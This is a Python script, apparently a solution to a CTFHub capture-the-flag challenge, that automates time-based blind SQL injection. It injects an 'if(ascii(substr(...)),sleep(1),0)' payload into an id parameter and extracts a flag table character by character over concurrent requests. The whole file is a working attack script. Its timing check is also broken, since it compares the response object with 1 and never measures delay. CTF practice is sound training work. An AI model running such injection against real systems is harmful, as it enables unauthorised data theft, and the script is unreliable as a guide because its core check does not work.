import aiohttp
import asyncio

url='http://challenge-c29941542d2310ea.sandbox.ctfhub.com:10800/?id=1 and '
flag='if(ascii(substr((select flag from flag),%d,1))=%d,sleep(1),0) '


async def fetch(session, url):
    async with session.get(url) as response:
        return response


async def batch_fetch(session, urls):
    tasks = [fetch(session, url) for url in urls]
    return await asyncio.gather(*tasks)


def get_payload(payload, i, j):
    return payload % (i, j)


async def main():
    response = ""
    # 设置并发数量
    batch_size = 10

    async with aiohttp.ClientSession() as session:
        for i in range(1, 40):
            new_response = response
            for j in range(31, 128, batch_size):
                # 创建一批URL
                urls = []
                for k in range(batch_size):
                    if j + k < 128:
                        end_url = url + get_payload(flag, i, j + k)
                        print(end_url)
                        urls.append(end_url)

                # 并发发送请求
                results = await batch_fetch(session, urls)

                # 处理结果
                for k, result in enumerate(results):
                    if result > 1:
                        response += chr(j + k)
                        break
                else:
                    continue
                break

            if len(new_response) == len(response):
                break
    print('结果为: %s' % response)


if __name__ == "__main__":
    asyncio.run(main())
